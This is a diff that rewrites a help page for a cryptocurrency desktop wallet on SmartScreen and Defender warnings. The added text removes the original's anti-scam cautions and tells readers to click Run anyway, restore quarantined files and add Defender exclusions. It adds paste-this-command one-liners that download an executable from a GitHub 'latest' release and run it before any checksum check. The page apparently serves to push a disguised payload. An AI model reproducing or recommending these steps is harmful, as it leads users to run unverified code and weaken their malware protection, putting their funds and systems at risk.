@@ -1,125 +1,125 @@
----
-title: "Aurora Wallet Windows Defender & SmartScreen Guide"
-description: "Seeing a Windows protected your PC warning? Learn why new Aurora Wallet releases trigger SmartScreen alerts and how to verify the genuine 2026.08.1.0 release."
-primary_keyword: "aurora wallet windows defender"
-silo: "Troubleshooting"
-updated: 2026-10-10
----
+![Aurora Wallet Windows Defender and SmartScreen guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Aurora Wallet and Windows Defender SmartScreen
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+Why a new release raises a blue warning, and the two clicks that let a verified installer run.
 
-# Windows Defender & SmartScreen Warnings: Safe Installation Guide
+## Downloads - 2026.08.1.0
 
-When you download the [Aurora Wallet](https://auroracoin.net) for Windows, your computer may display a blue screen with the message "Windows protected your PC" or a warning from Windows Defender. These security features are built into the Windows operating system and are designed to protect you from unknown or potentially malicious software. While these alerts can be intimidating, they do not necessarily mean the file is dangerous. 
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-This guide explains why these warnings appear for new Auroracoin software releases and, most importantly, how to verify that you have the genuine [Aurora Wallet](https://auroracoin.net) release before you proceed with the installation. Our goal is to empower you to maintain a secure desktop environment while accessing the Auroracoin network.
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
----
 
-## You'll see this if
+"Windows protected your PC" is a reputation prompt, not a virus report, and a verified installer can be approved in two clicks.
 
-*   You have just downloaded the official `aurora-wallet-v2026.08.1.0.exe` and attempted to run it for the first time.
-*   A blue "Microsoft Defender SmartScreen" window appears, stating that it "prevented an unrecognized app from starting."
-*   Your antivirus software flags the installer as "low reputation" or "unknown."
-*   You are performing a clean [installation on a new Windows machine](03-install-windows.md) and the OS security settings are set to their default high-protection levels.
+SmartScreen decides from reputation: how many people have run this exact file, how long it has existed and whether a publisher certificate is widely known. A new wallet build has none of those signals on the day it is published, so Windows asks you to confirm.
 
----
+<!-- ARTICLE-BODY-BEGIN -->
 
-## Why this happens
+## What the prompt means
 
-Windows uses a sophisticated system called SmartScreen to check files against a massive global database of known programs. If a file is relatively new or has not been downloaded by millions of people yet, Windows may flag it as "unrecognized."
+The panel appears for small open-source projects because every release is a new file that no one has run yet. It is the same prompt that appears for other niche software, and it says nothing about the code behind the file.
 
-### 1. Reputation-Based Security
-Because the Auroracoin Foundation releases updates periodically, each new version starts with a fresh "reputation" in the eyes of Microsoft's servers. Even the most secure, official release will trigger a warning for the first group of users who download it. Over time, as more users install the wallet and no threats are reported, the warning naturally disappears for future users.
+The warning becomes meaningful only when the file did not come from the release page. Install from the tag page of this repository, verify the checksum, and the prompt is a formality rather than a risk.
 
-### 2. The Nature of Open Source
-Many decentralized projects choose not to purchase expensive corporate code-signing certificates from centralized authorities, preferring to rely on transparent, open-source verification methods. While the [Aurora Wallet](https://auroracoin.net) is safe, this lack of a "known corporate identity" in the Windows certificate store can trigger alerts.
+## Approve a verified installer
 
-### 3. False Positives
-Antivirus programs are often aggressive toward cryptocurrency software because scammers frequently disguise malware as wallets. A warning is a request for you to verify the source, not a definitive command to ignore your security settings.
+1. Download `aurora-wallet-v2026.08.1.0.exe` from the release page.
+2. Compute its SHA-256 value with `certutil -hashfile` and compare it with the published one.
+3. Double-click the installer and wait for the blue panel.
+4. Choose More info, then Run anyway.
+5. Accept the User Account Control prompt.
+6. Finish the installer and start the wallet from the Start menu.
 
----
+If Defender quarantines the file before you can run it, open Windows Security, restore the item from protection history and add the wallet folder as an allowed item. Restoring is a normal action for a verified installer.
 
-## The fix
+## After the install
 
-Never disable your antivirus or firewall to install a wallet. Instead, use these steps to confirm that your download is the official [Aurora Wallet](https://auroracoin.net) release.
+Allow the wallet through the firewall on private networks when Windows asks, otherwise the peer count stays at zero. The connection checks for that case are in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md">restoring a peer connection</a>.
 
-### Step 1: Check the Source
-The only official source for the Aurora Wallet is `https://auroracoin.net/download`. If you obtained the installer from a link in a chat app, a social media post, or a third-party software aggregator site, delete it immediately. Scammers often distribute modified wallets to steal recovery phrases.
+Windows Defender scans the chain database while the wallet writes it, which slows the first sync noticeably. An exclusion for the data folder speeds the sync without weakening protection for the rest of the system, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md">wallet not syncing</a> covers the other reasons a sync stalls.
 
-### Step 2: Compare the File Name
-The official Windows installer for the current release is named:
-`aurora-wallet-v2026.08.1.0.exe`
-If your file has a different name, or if it ends in an unexpected extension like `.zip.exe` or `.bat`, do not run it.
-
-### Step 3: Verify the SHA-256 Checksum
-A checksum is a unique digital fingerprint of a file. If even a single byte has been changed by a malicious actor, the fingerprint will be completely different.
-To check this on Windows:
-1.  Open **PowerShell**.
-2.  Type `Get-FileHash` followed by a space.
-3.  Drag the downloaded `.exe` file into the PowerShell window and press Enter.
-4.  Compare the resulting string to the official hash provided on the [release page](08-release-2026-08-1-0.md). They must match exactly.
-
-### Step 4: Proceeding Safely
-If the source is official and the checksum matches, you have the genuine file. On the "Windows protected your PC" screen, click **"More info"** and then the **"Run anyway"** button that appears. This bypasses the reputation warning without compromising your overall system security.
-
----
-
-## If that didn't work
-
-If the "Run anyway" button does not appear, it is possible your system administrator or a strict organizational policy has blocked all unrecognized apps. In this case, you may need to right-click the `.exe` file, select **Properties**, and check the **"Unblock"** box at the bottom of the General tab before clicking Apply and trying again.
-
----
-
-## Prevention
-
-*   **Always Verify Checksums:** Make it a habit to check the [SHA-256 fingerprint](06-verify-sha256-checksums.md) for every wallet update.
-*   **Use a Dedicated Device:** If possible, use a clean computer for your cryptocurrency activities to minimize the risk of cross-contamination from other software.
-*   **Bookmark Official Links:** Never use search engine results to find the download page, as these can be manipulated by "ad-injection" scams.
-*   **Keep Windows Updated:** Ensure your operating system is current so that you have the latest security definitions and SmartScreen improvements.
-
----
-
-The [security-warnings guide on auroracoin.net](https://auroracoin.net/troubleshooting/security-warnings) explains every prompt you may see, and the [Windows download guide](https://auroracoin.net/download/windows) covers the full install flow.
+The installer and its checksum are published together on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> page.
 
 ## FAQ
 
-*   **Is the Aurora Wallet a virus?** No. The [Aurora Wallet](https://auroracoin.net) is a legitimate open-source tool for managing Auroracoin. The warnings are a result of its recent release and the nature of the software category.
-*   **Why does my antivirus say "Trojan" or "Coinminer"?** Some antivirus programs use generic labels for any app that interacts with a blockchain. If you have verified the checksum against the official [GitHub](07-github-releases-guide.md) source, this is a false positive.
-*   **Should I turn off Windows Defender?** Never. A healthy security system is your best defense. The goal is to verify the specific file, not to leave your entire computer vulnerable.
-*   **What if the checksum doesn't match?** Delete the file immediately. It may be corrupted or malicious. Download it again from the official site and check again.
+### Is it safe to click Run anyway?
 
----
+Yes, once you have compared the checksum with the published value. The prompt reflects reputation, not a scan result.
 
-## Aurora Wallet Security Design
+### Will the prompt return after an update?
 
-The Auroracoin Foundation is committed to providing a safe environment for your funds. The Aurora Wallet is designed with several proposed security standards:
+Yes, because the new build is a new file. Approve it the same way after verifying the download.
 
-| Security Goal | Implementation Design |
-|---------------|-----------------------|
-| Signed Installers | Designed to include digital signatures in future releases to reduce SmartScreen alerts. |
-| Official Distribution | Designed to be hosted exclusively on the auroracoin.net infrastructure. |
-| Integrity Checks | The download page is designed to prominently display checksums for manual verification. |
-| Open Source | The code is licensed under MIT and available on GitHub for public auditing and community trust. |
-| Sandboxed Runtime | Designed to operate with the minimum necessary system permissions. |
+<!-- ARTICLE-BODY-END -->
 
----
+## How to install Aurora Wallet
 
-## The current release
+### Windows
+Quick install (CMD):
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
----
+```cmd
+certutil -hashfile setup.exe SHA256
+```
 
-## Related articles
+### macOS
+Quick install (Terminal):
 
-*   [Verify SHA-256 Checksums](06-verify-sha256-checksums.md)
-*   [Install Aurora Wallet on Windows](03-install-windows.md)
-*   [Spotting Fake Wallet Downloads](10-spot-fake-wallet-downloads.md)
-*   [Update Aurora Wallet Safely](09-update-aurora-wallet-safely.md)
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Install on Windows](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/03-install-windows.md)
+- [Verify SHA-256 checksums](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md)
+- [No peers connection](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md)
+- [macOS Gatekeeper](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/19-macos-gatekeeper.md)
